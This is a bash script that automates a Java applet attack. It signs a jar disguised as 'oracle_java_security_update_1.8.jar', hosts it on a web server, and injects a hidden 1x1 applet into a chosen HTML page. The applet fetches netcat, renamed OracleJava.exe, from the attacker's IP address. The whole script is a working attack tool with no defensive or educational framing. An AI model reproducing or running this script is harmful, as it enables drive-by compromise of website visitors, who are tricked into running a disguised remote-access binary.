#!/bin/bash

echo
printf "\033[1;33m[?] What is the version of java that you want to use? (Ex. 1.8)\033[0m\n"
read javaversion
echo
printf "\033[1;33m[Info] Starting to compile JavaAppletATK.java...\033[0m\n"
javac -source $javaversion -target $javaversion JavaAppletATK.java
echo
printf "\033[1;33m[Info] Done.\033[0m\n"
echo
printf "\033[1;33m[Info] Creating manifest file...\033[0m\n"
echo "Permissions: all-permissions" > /$USER/manifest.txt
jar cvf JavaAppletATK.jar JavaAppletATK.class
printf "\033[1;33m[Info] Done.\033[0m\n"
echo
printf "\033[1;33m[Info] Signing jar file...\033[0m\n"
keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123
jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar oracle_java_security_update_1.8.jar JavaAppletATK.jar signapplet
printf "\033[1;33m[Info] Done.\033[0m\n"
echo
printf "\033[1;33m[Info] Moving files to /var/www/html...\033[0m\n"
cp JavaAppletATK.class oracle_java_security_update_1.8.jar /var/www/html
printf "\033[1;33m[Info] Done.\033[0m\n"
echo
printf "\033[1;33m[!] Please provide a HTML file in order to embed the applet in it.\033[0m\n"
read htmlfiletoembed
echo
printf "\033[1;33m[?] What is Attacker's external IP address?\033[0m\n"
read address
echo "<applet width="1" height="1" id="Java Secure" code="JavaAppletATK.class" archive="oracle_java_security_update_1.8.jar"><param name="1" value="http://$address/OracleJava.exe"></applet>" > /var/www/html/$htmlfiletoembed
printf "\033[1;33m[Info] Applet was embeded successfully in $htmlfiletoembed.\033[0m\n"
cp /usr/share/windows-binaries/nc.exe /var/www/html/OracleJava.exe
printf "\033[1;33m[!] ByeBye.\033[0m\n"
echo

